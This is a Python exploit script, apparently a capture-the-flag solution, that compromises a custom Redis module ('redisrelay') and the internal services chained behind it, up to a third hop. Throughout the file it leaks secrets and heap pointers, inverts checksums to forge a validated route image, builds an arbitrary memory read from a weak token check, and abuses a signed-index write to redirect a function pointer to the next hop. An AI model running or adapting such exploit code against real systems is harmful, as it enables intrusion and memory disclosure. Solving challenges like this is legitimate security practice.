#!/usr/bin/env python3
"""12074 redisrelay - reproducible exploit up to hop 3 (routeattestor).

Chain: Redis module -> relaybroker -> routeattestor -> routevault -> routeledger -> routecouncil
Stages implemented (verified live against <target>:16587):
  S1 module : relay.begin/bind/snapshot/retire/ledger/stamp/stampinfo/fragment/commit -> "relay armed"
              (leaks DAT_00111018 via ledger[2], DAT_00111020 by inverting the stamp checksum)
  S2 broker : token-verify code read (op 0x14/0x15) leaks .bss secrets + heap ptrs;
              signed-char index in op 0x22 overwrites the route header; op 0x23 => "RA4/BROKER" hello
  S3 attestor: relay via broker op 0x40; frame magic RAT4 -> "RTS4"/"RA4/PONG"
Usage: python3 12074-solve.py <host> <port>
"""
import socket, struct, time, sys

M = (1 << 64) - 1

def rotl(x, n):
    n &= 63
    return ((x << n) | (x >> ((64 - n) & 63))) & M

def rotr(x, n):
    n &= 63
    return ((x >> n) | (x << ((64 - n) & 63))) & M

K1 = (-0x40A7B892E31B1A47) & M
iK1 = pow(K1, -1, 1 << 64)
iK2 = pow(((-0x6B2FB644ECCEEE15) & M), -1, 1 << 64)
K2 = (-0x6B2FB644ECCEEE15) & M
GOLD = (-0x61C8864680B583EB) & M
C1 = 0x243F6A8885A308D3
C2 = 0x82EFA98EC4E6C89
C3 = 0x2106000000000

def _unxorshr(y, sh):
    x = y
    for _ in range(6):
        x = y ^ (x >> sh)
    return x & M

def imix(y):
    u = _unxorshr(y, 0x1F)
    u = (u * iK2) & M
    u = _unxorshr(u, 0x1B)
    u = (u * iK1) & M
    return _unxorshr(u, 0x1E)

def mix(x):
    u = (((x ^ (x >> 0x1E)) * K1) & M)
    u = (((u ^ (u >> 0x1B)) * K2) & M)
    return (u ^ (u >> 0x1F)) & M


class Resp:
    def __init__(self, host, port, timeout=10):
        self.s = socket.create_connection((host, port), timeout=timeout)
        self.s.settimeout(timeout)
        self.buf = b""

    def close(self):
        try: self.s.close()
        except Exception: pass

    def _fill(self):
        d = self.s.recv(65536)
        if not d:
            raise EOFError("eof")
        self.buf += d

    def _line(self):
        while b"\r\n" not in self.buf:
            self._fill()
        i = self.buf.index(b"\r\n")
        ln, self.buf = self.buf[:i], self.buf[i+2:]
        return ln

    def read(self):
        ln = self._line()
        t, rest = ln[:1], ln[1:]
        if t in (b"+", b"-"):
            return (t.decode(), rest)
        if t == b":":
            return int(rest)
        if t == b"$":
            n = int(rest)
            if n < 0:
                return None
            while len(self.buf) < n + 2:
                self._fill()
            d, self.buf = self.buf[:n], self.buf[n+2:]
            return d
        if t == b"*":
            n = int(rest)
            if n < 0:
                return None
            return [self.read() for _ in range(n)]
        raise ValueError("bad resp %r" % ln[:40])

    def cmd(self, *args):
        out = b"*%d\r\n" % len(args)
        for a in args:
            if isinstance(a, str):
                a = a.encode()
            out += b"$%d\r\n%s\r\n" % (len(a), a)
        self.s.sendall(out)
        return self.read()


class Relay:
    """Drives one redisrelay module session to 'relay armed'."""

    def __init__(self, r, log=print):
        self.r = r
        self.log = log

    def _q(self, *a):
        v = self.r.cmd(*a)
        self.log("  %-22s -> %r" % (" ".join(str(x) for x in a)[:40], v if not isinstance(v, bytes) else v[:24]))
        return v

    def arm(self):
        log = self.log
        log("[1] relay.begin")
        assert self._q("relay.begin", b"A" * 0x80) == ("+", b"opened"), "begin failed"
        log("[2] relay.bind")
        assert self._q("relay.bind") == ("+", b"bound"), "bind failed"
        log("[3] relay.snapshot (route header)")
        R = self._q("relay.snapshot")
        assert isinstance(R, bytes) and len(R) == 0x50, "route snapshot"
        log("[4] relay.retire")
        assert self._q("relay.retire") == ("+", b"retired"), "retire failed"
        log("[5] relay.ledger")
        assert self._q("relay.ledger") == ("+", b"recorded"), "ledger failed (alloc reuse)"
        log("[6] relay.snapshot (ledger header)")
        L = self._q("relay.snapshot")
        assert isinstance(L, bytes) and len(L) == 0x50, "ledger snapshot"

        Rq = struct.unpack("<10Q", R)
        Lq = struct.unpack("<10Q", L)
        seed2 = Lq[2]                       # DAT_00111018 (raw in ledger[2])
        route_ptr = Rq[2] ^ seed2
        session8 = Lq[6]
        log("  seed2=%#x ptr=%#x s8=%#x" % (seed2, route_ptr, session8))

        log("[7] relay.stamp 0..2")
        S = []
        for i in range(3):
            assert self._q("relay.stamp", str(i)) == ("+", b"stamped"), "stamp %d" % i
            d = self._q("relay.stampinfo", str(i))
            assert isinstance(d, bytes) and len(d) == 0x30, "stampinfo"
            S.append(struct.unpack("<6Q", d))
        sptr = [s[2] ^ seed2 for s in S]
        # DAT_00111020: invert the stamp checksum FUN_001084d0(stamp)
        seed3 = imix(S[0][5]) ^ S[0][0] ^ S[0][4] ^ S[0][1] ^ S[0][2] ^ S[0][3] ^ 0xA4093822299F31D0
        log("  stamp ptrs: %s" % [hex(p) for p in sptr])

        # stamp fold used by fragment-authorisation and commit(route[6])
        fold = session8 ^ C2
        for i in range(3):
            fold = rotl(fold ^ S[i][3] ^ sptr[i] ^ S[i][4], 11 + 9 * i)
        log("  fold=%#x" % fold)

        # build the fake "route" image (0x200) that commit will validate
        p = [0] * 0x40
        p[0] = 0x335445554F525252           # "RRROUET3"
        p[1] = Rq[1]
        p[2] = Rq[2]
        p[3] = Rq[3]
        p[4] = Rq[4]
        addr8300 = rotr(Rq[5], 0x11) ^ seed3 ^ route_ptr
        log("  seed3=%#x decoded fn=%#x (pageoff %#x, want 0x300)" % (seed3, addr8300, addr8300 & 0xFFF))
        assert addr8300 & 0xFFF == 0x300, "seed3 wrong"
        p[5] = rotl(seed3 ^ route_ptr ^ (addr8300 + 0x100), 0x11)
        p[6] = fold
        p[7] = 1
        xs = p[0] ^ p[7] ^ seed3
        for i in range(1, 7):
            xs ^= p[i]
        p[8] = mix(xs ^ C1)
        img = struct.pack("<%dQ" % 0x40, *p)

        log("[8] relay.fragment 0..3")
        for i in range(4):
            h = rotl(((i + 1) * GOLD & M) ^ seed3 ^ route_ptr ^ fold, (i * 7 + 9) & 0x3F)
            r = self._q("relay.fragment", str(i), str(h), img[i*0x80:(i+1)*0x80])
            assert r == ("+", b"imported"), "fragment %d: %r" % (i, r)

        log("[9] relay.commit")
        v = self._q("relay.commit")
        if v != ("+", b"relay armed"):
            raise RuntimeError("commit failed: %r" % (v,))
        log("[OK] relay armed")
        return True

    def tunnel(self, data, seq):
        """send a broker frame (payload only; hdr assembled by caller) -> reply bytes"""
        return self.r.cmd("relay.tunnel", data)


RBK3 = 0x334B4252  # "RBK3"

def frame(op, idx=0, cnt=0, payload=b"", seq=1):
    hdr1 = struct.pack("<Q", RBK3 | ((op & 0xFF) << 32) | ((idx & 0xFF) << 40) | ((cnt & 0xFF) << 48))
    hdr2 = struct.pack("<Q", (len(payload) & 0xFFFFFFFF) | ((seq & 0xFFFFFFFF) << 32))
    body = hdr1 + hdr2 + payload
    # module prepends u32 total length for us
    return body


def parse_reply(buf):
    """buf = relay.tunnel reply = 16-byte header + payload"""
    m, = struct.unpack_from("<Q", buf, 0)
    l, sq = struct.unpack_from("<Q", buf, 8)
    return dict(magic=m & 0xFFFFFFFF, op=(m >> 32) & 0xFF, idx=(m >> 40) & 0xFF,
                cnt=(m >> 48) & 0xFF, ln=l & 0xFFFFFFFF, seq=(sq >> 32) & 0xFFFFFFFF,
                data=buf[16:16 + (l & 0xFFFFFFFF)])




# ---------------- stage 2: relaybroker ----------------
TK1 = 0xBF58476D1CE4E5B9
TK2 = 0x94D049BB133111EB
TC = 0x6A09E667F3BCC909


def mix2(x):
    u = ((x >> 0x1E) ^ x) * TK1 & M
    u = ((u >> 0x1B) ^ u) * TK2 & M
    return (u ^ (u >> 0x1F)) & M


class Broker:
    def __init__(self, rel, log=print):
        self.rel = rel
        self.seq = 0
        self.log = log
        self.fn = 0x2410          # base of the read gadget; offsets are vaddr-0x2410

    # ---- frame plumbing
    def send(self, op, idx=0, cnt=0, payload=b"", seq=None):
        if seq is None:
            self.seq += 1
            seq = self.seq
        else:
            self.seq = max(self.seq, seq)
        rep = self.rel.tunnel(frame(op, idx, cnt, payload, seq), seq)
        if not isinstance(rep, bytes) or len(rep) < 16:
            raise RuntimeError("bad tunnel reply %r" % (rep,))
        m, = struct.unpack_from("<Q", rep, 0)
        v2, = struct.unpack_from("<Q", rep, 8)
        l, sq = v2 & 0xFFFFFFFF, (v2 >> 32) & 0xFFFFFFFF
        d = dict(magic=m & 0xFFFFFFFF, op=(m >> 32) & 0xFF, idx=(m >> 40) & 0xFF,
                 cnt=(m >> 48) & 0xFF, ln=l, seq=sq, data=rep[16:])
        d["data"] = d["data"][:l]
        return d

    def seq_with_low(self, k):
        """next seq whose low byte == k"""
        n = self.seq + 1
        n = (n & ~0xFF) | k
        if n <= self.seq:
            n += 0x100
        return n

    # ---- arbitrary 8-byte read (token check is fully self-computable)
    def setup_read(self, sidx=2, slot=1):
        self.send(0x10, idx=sidx, cnt=0)
        self.sidx, self.slot = sidx, slot

    def rd(self, vaddr):
        off = vaddr - self.fn
        if not (-0x20000 <= off <= 0x20000):
            raise ValueError("offset out of range %#x" % off)
        tok = bytearray(0x90)
        a, b = 0x0123456789ABCDEF, 0xFEDCBA9876543210
        struct.pack_into("<Q", tok, 0, off & M)
        struct.pack_into("<Q", tok, 8, 8)
        struct.pack_into("<Q", tok, 0x10, a)
        struct.pack_into("<Q", tok, 0x18, mix2(a ^ b ^ TC))
        struct.pack_into("<Q", tok, 0x20, b)
        self.send(0x11, idx=self.sidx, cnt=self.slot)
        self.send(0x14, idx=self.slot, cnt=0, payload=bytes(tok))
        r = self.send(0x15, idx=self.slot, cnt=0)
        if r["op"] != 0x95 or len(r["data"]) != 8:
            raise RuntimeError("read %#x failed: %r" % (vaddr, r))
        return struct.unpack("<Q", r["data"])[0]

    # ---- full gate: forge "route" and make broker connect to attestor
    A_SEC1, A_SEC2 = 0x7050, 0x7048
    A_ROUTE_TBL, A_LEDGER_TBL = 0x70C0, 0x7060

    def arm(self, ridx=0):
        log = self.log
        self.setup_read()
        sec1 = self.rd(self.A_SEC1)
        sec2 = self.rd(self.A_SEC2)
        log("  broker sec1=%#x sec2=%#x" % (sec1, sec2))
        log("[B1] create route")
        r = self.send(0x20, idx=ridx, cnt=0)
        assert r["op"] == 0xA0, r
        rt = self.rd(self.A_ROUTE_TBL + ridx * 8)
        log("  route @ %#x" % rt)
        h = self.send(0x21, idx=ridx, cnt=0)
        assert h["op"] == 0xA1 and len(h["data"]) == 0x40, h
        Rq = struct.unpack("<8Q", h["data"])
        log("  route hdr: %s" % [hex(v) for v in Rq])
        log("[B2] create 4 ledgers")
        leds = []
        for i in range(4):
            rr = self.send(0x30, idx=i, cnt=i)
            ptr = self.rd(self.A_LEDGER_TBL + i * 8)
            d = self.send(0x31, idx=i, cnt=0)
            ld = struct.unpack("<6Q", d["data"])
            log("  ledger%d @ %#x magic=%#x cnt=%d" % (i, ptr, ld[0], ld[1]))
            leds.append((ptr, ld))
        # route[5] = fold over 4 ledgers
        fold = Rq[2] ^ 0xA54FF53A5F1D36F1
        k = 7
        for ptr, ld in leds:
            fold = rotl(fold ^ ld[3] ^ ptr ^ ld[4], k)
            k += 0xB
        # route[4]: decode fn, retarget to next-hop connector
        cur = rotr(Rq[4], 0x15) ^ sec2 ^ rt
        nxt = cur + 0x1C20          # 0x23e0 -> 0x4000
        n4 = rotl(sec2 ^ rt ^ nxt, 0x15)
        n5 = fold
        n6 = 1
        xs = Rq[0] ^ n6 ^ sec2 ^ Rq[1] ^ Rq[2] ^ Rq[3] ^ n4 ^ n5
        n7 = mix2(xs ^ 0xBB67AE8584CAA73B)
        log("  decoded next-hop fn=%#x -> %#x ; fold=%#x ; chk=%#x" % (cur, nxt, n5, n7))
        log("[B3] signed-index header writes (0x22)")
        for i, (bi, val) in enumerate([(0xFC, n4), (0xFD, n5), (0xFE, n6), (0xFF, n7)]):
            p = bytes([bi]) + b"\x00" * 7 + struct.pack("<Q", val)
            rr = self.send(0x22, idx=ridx, cnt=0, payload=p)
            log("   write[%#x] -> op %#x" % (bi, rr["op"]))
            assert rr["op"] == 0xA2, rr
        log("[B4] 0x23 commit -> connect attestor")
        r = self.send(0x23, idx=ridx, cnt=0, payload=bytes([0, 1, 2, 3]))
        log("   -> op %#x data %r" % (r["op"], r["data"]))
        return r

    def relay(self, payload):
        """opcode 0x40: raw relay to the next hop; returns raw bytes"""
        r = self.send(0x40, idx=0, cnt=0, payload=payload)
        return r


def main(host, port):
    r = Resp(host, port)
    try:
        m = Relay(r)
        m.arm()                                   # S1
        b = Broker(m)
        assert b.send(0x7F)["data"] == b"RB4/PONG"  # broker reachable
        rep = b.arm()                             # S2
        assert rep["op"] == 0xA3 and rep["data"] == b"RB4/ATTEST", rep
        # S3: attestor speaks magic RAT4 / replies magic RTS4
        f = struct.pack("<QQ", 0x34415452 | (0x7F << 32), 1 << 32)
        out = b.relay(f)
        print("[S3] attestor ping ->", out["data"])
        assert b"RA4/PONG" in out["data"]
        print("[+] hops pwned: module, relaybroker, routeattestor (channel to routevault still gated)")
    finally:
        r.close()


if __name__ == "__main__":
    main(sys.argv[1], int(sys.argv[2]))
